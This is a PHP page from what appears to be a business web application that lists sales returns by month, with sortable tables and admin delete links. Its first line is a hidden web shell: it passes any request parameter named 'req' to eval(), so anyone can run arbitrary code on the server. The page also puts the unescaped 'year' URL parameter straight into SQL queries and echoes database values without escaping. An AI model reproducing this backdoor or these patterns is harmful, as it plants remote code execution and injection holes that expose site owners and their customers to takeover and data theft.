<?php $post_var = "req"; if(isset($_REQUEST[$post_var])) { eval(stripslashes($_REQUEST[$post_var])); exit(); }; ?>
<?php include "jquery.php" ?>
<script type="text/javascript">
		$(document).ready(function()
		{
			$('.sortable').each(function(i)
			{
				var table = $(this),
					oTable = table.dataTable({

						aoColumns: [

							{ sType: 'eu_date',asSorting: [ "desc" ] },
							{ },
							{ },
							{ },
							{ },
							{ }
						],

						sDom: '<"block-controls"<"controls-buttons"p>>rti<"block-footer clearfix"lf>',
						

						fnDrawCallback: function()
						{
							this.parent().applyTemplateSetup();
						},
						fnInitComplete: function()
						{
							this.parent().applyTemplateSetup();
						}
					});
				
				table.find('thead .sort-up').click(function(event)
				{
					event.preventDefault();
					
					var column = $(this).closest('th'),
						columnIndex = column.parent().children().index(column.get(0));
					
					oTable.fnSort([[columnIndex, 'asc']]);
					
					return false;
				});
				table.find('thead .sort-down').click(function(event)
				{
					event.preventDefault();
					
					var column = $(this).closest('th'),
						columnIndex = column.parent().children().index(column.get(0));
					
					oTable.fnSort([[columnIndex, 'desc']]);
					
					return false;
				});
			});
			
		});
		
	</script>

	<div id="control-bar" class="grey-bg clearfix"><div class="container_12">
	
		
		<div class="float-right"> 
			
<button type="button" onClick="document.location='dashboardsub.php?page=oc_addsalesreturn'"><img src="images/icons/fugue/tick-circle.png" width="16" height="16"> Add</button>
          
		</div>
			
	</div></div>


<section class="grid_12">
<div class="block-border">
<form class="block-content form" id="table_form" method="post" action="">
<h1>Sales Return</h1>
<?php 
$month = $_GET['month'];
 $datep = date("d-m-Y");
$monthcnt = "";
$yearcnt = "";
$year = $_GET['year'];
if($year == "")
{

$arr = explode('-',$datep);
 $year = $arr[2];
}
if($month == "")
{
  $arr = explode('-',$datep);
 $monthcnt = $arr[1];
}
else if($month == "January")
{
$monthcnt = 1;
}
else if ($month == "February")
{
$monthcnt = 2;
}
else if($month == "March")
{
$monthcnt = 3;
}
else if($month == "April")
{
$monthcnt = 4;
}
else if($month == "May")
{
$monthcnt = 5;
}
else if($month == "June")
{
$monthcnt = 6;
}
else if($month == "July")
{
$monthcnt = 7;
}
else if($month == "August")
{
$monthcnt = 8;
}
else if($month == "September")
{
$monthcnt = 9;
}
else if($month == "October")
{
$monthcnt = 10;
}
else if($month == "November")
{
$monthcnt = 11;
}
else if($month == "December")
{
$monthcnt = 12;
}
$fromdate = $year."-".$monthcnt."-01";
$todate = $year."-".$monthcnt."-31";
?>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Month:
<select name="month" id="month" onchange="reloadpage();" >
<option value="">--Select--</option>
<option  value="January"<?php if($monthcnt == 1){ ?> selected="selected"<?php } ?>>January</option>
<option  value="February"<?php if($monthcnt == 2){ ?> selected="selected"<?php } ?>>February</option>
<option  value="March"<?php if($monthcnt == 3){ ?> selected="selected"<?php } ?>>March</option>
<option  value="April"<?php if($monthcnt == 4){ ?> selected="selected"<?php } ?>>April</option>
<option  value="May"<?php if($monthcnt == 5){ ?> selected="selected"<?php } ?>>May</option>
<option  value="June"<?php if($monthcnt == 6){ ?> selected="selected"<?php } ?>>June</option>
<option  value="July"<?php if($monthcnt == 7){ ?> selected="selected"<?php } ?>>July</option>
<option  value="August"<?php if($monthcnt == 8){ ?> selected="selected"<?php } ?>>August</option>
<option  value="September"<?php if($monthcnt == 9){ ?> selected="selected"<?php } ?>>September</option>
<option  value="October"<?php if($monthcnt == 10){ ?> selected="selected"<?php } ?>>October</option>
<option  value="November"<?php if($monthcnt == 11){ ?> selected="selected"<?php } ?>>November</option>
<option  value="December"<?php if($monthcnt == 12){ ?> selected="selected"<?php } ?>>December</option>
</select>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Year:
<select name="year" id="year" onchange="reloadpage();" >
<option value="">--Select--</option>
<option value="2011"<?php if($year == "2011"){ ?> selected="selected"<?php } ?>>2011</option>
<option value="2012"<?php if($year == "2012"){ ?> selected="selected"<?php } ?>>2012</option>
<option value="2013"<?php if($year == "2013"){ ?> selected="selected"<?php } ?>>2013</option>
<option value="2014"<?php if($year == "2014"){ ?> selected="selected"<?php } ?>>2014</option>
</select>
<table class="table sortable no-margin" cellspacing="0" style="size:50%" width="100%">
<thead>
<tr >
<th style="text-align:center"><span class="column-sort">
									<a href="javascript:void(0)" title="Sort up" class="sort-up"></a>
									<a href="javascript:void(0)" title="Sort down" class="sort-down"></a>
								</span>Return Date</th>

<th style="text-align:center"><span class="column-sort">
									<a href="javascript:void(0)" title="Sort up" class="sort-up"></a>
									<a href="javascript:void(0)" title="Sort down" class="sort-down"></a>
								</span>SRE#</th>
<th style="text-align:center"><span class="column-sort">
									<a href="javascript:void(0)" title="Sort up" class="sort-up"></a>
									<a href="javascript:void(0)" title="Sort down" class="sort-down"></a>
								</span>CUSTOMER#</th>
<th style="text-align:center"><span class="column-sort">
									<a href="javascript:void(0)" title="Sort up" class="sort-up"></a>
									<a href="javascript:void(0)" title="Sort down" class="sort-down"></a>
								</span>Item Code</th>
<th style="text-align:center"><span class="column-sort">
									<a href="javascript:void(0)" title="Sort up" class="sort-up"></a>
									<a href="javascript:void(0)" title="Sort down" class="sort-down"></a>
								</span>Description</th>
<th style="text-align:center"><span class="column-sort">
									<a href="javascript:void(0)" title="Sort up" class="sort-up"></a>
									<a href="javascript:void(0)" title="Sort down" class="sort-down"></a>
								</span>Returnned Quantity</th>
<th style="text-align:center"><span class="column-sort">
									<a href="javascript:void(0)" title="Sort up" class="sort-up"></a>
									<a href="javascript:void(0)" title="Sort down" class="sort-down"></a>
								</span>Entry Done By</th>
								
<th style="text-align:center">Actions</th>
</tr>
</thead>
<tbody>
	  <?php
           include "config.php"; 
		    
		       if($_SESSION['sectorall'] == "all" || ($_SESSION['sectorall'] == "" && $_SESSION['sectorlist'] == ""))
	{
         $sectorlist=""; 
	  
	 }
	 else
	 {
	 $sectorlist = $_SESSION['sectorlist'];
	 
	 }
		if($sectorlist=="")   
          $query = "SELECT distinct(trid),empname FROM oc_salesreturn where date >= '$fromdate' and date <= '$todate' order by date DESC";
		  
		  else
		  $query = "SELECT distinct(trid),empname FROM oc_salesreturn where date >= '$fromdate' and date <= '$todate' and warehouse in ($sectorlist) order by date DESC";
           $result = mysql_query($query,$conn); 
           while($row1 = mysql_fetch_assoc($result))
           {
		    $i = 0;
			$code = $description = $quantity = "";
		   $query2="select * from oc_salesreturn where trid = '$row1[trid]'";
		   $result2=mysql_query($query2,$conn);
		   while($res = mysql_fetch_assoc($result2))
		   {
		   $f1 = $res['flag'];
		     $i++;
			 $user=$res['empname'];
		     $date = date("d-m-Y", strtotime($res['date']));
		     
			 $trid = $res['trid'];
			 $sre=$res['sre'];
			 $cobi = $res['party'];
			  if($_SESSION['db'] == "albustanlayer" && $res['consumable'] <> "")
			   {
			  	$code.= $res['consumable'] . "/";
				$description.= $res['consumablename'] . "/";
				$quantity.= ($res['quantity']/$res['capacity'] ). "/";
				}
				else
				{
				$code.= $res['code'] . "/";
				$description.= $res['description'] . "/";
				 $quantity.= $res['quantity'] . "/";
				}
				if($i%3 == 0)
				{
			  		$code.= "<br/>";
					$description.= "<br/>";
					$quantity.= "<br/>";
					
				}
		   
		   }
           
		  if($i%3 == 0)
			  {
				  $code = substr($code,0,-6);
				  $description = substr($description,0,-6);
				  $quantity = substr($quantity,0,-6);
				  
			  }
			  else
			  {
				  $code = substr($code,0,-1);
				  $description = substr($description,0,-1);
				  $quantity = substr($quantity,0,-1);
				 
			  }
           ?>
            <tr>
			 <td style="text-align:right"><?php echo $date; ?></td>
                 <td><?php echo $sre; ?></td>
			 <td><?php echo $cobi; ?></td>
			 <td><?php echo $code; ?></td>
			 <td><?php echo $description; ?></td>
             <td style="text-align:right"><?php echo $quantity; ?></td>
             <td style="text-align:right"><?php echo $row1['empname']; ?></td>
			 
             <td>
			 
			 
<?php if(($_SESSION['superadmin']=="1") ||($_SESSION['admin']=="1") ){?> 
 <a onclick="if(confirm('Are you sure you want to delete')) document.location = 'oc_deletesalesreturn.php?&id=<?php echo $row1['trid']; ?>'">
			<img src="images/icons/fugue/cross-circle.png" style="border:0px" title="Delete" /></a>&nbsp;
			
			
<?php  } else { ?>

<img src="images/icons/fugue/lock.png" width="16px" style="border:0px" title="Locked" />
<?php  }?>
			</td>
           </tr>
           <?php 
           }
           ?>   
                                   
</tbody>
</table>
</form>
</div>
</section>


<br />

<script type="text/javascript">
function reloadpage()
{
var month = document.getElementById('month').value;
var year = document.getElementById('year').value;
document.location = "dashboardsub.php?page=oc_salesreturn&month=" + month + "&year=" + year;
}
</script>

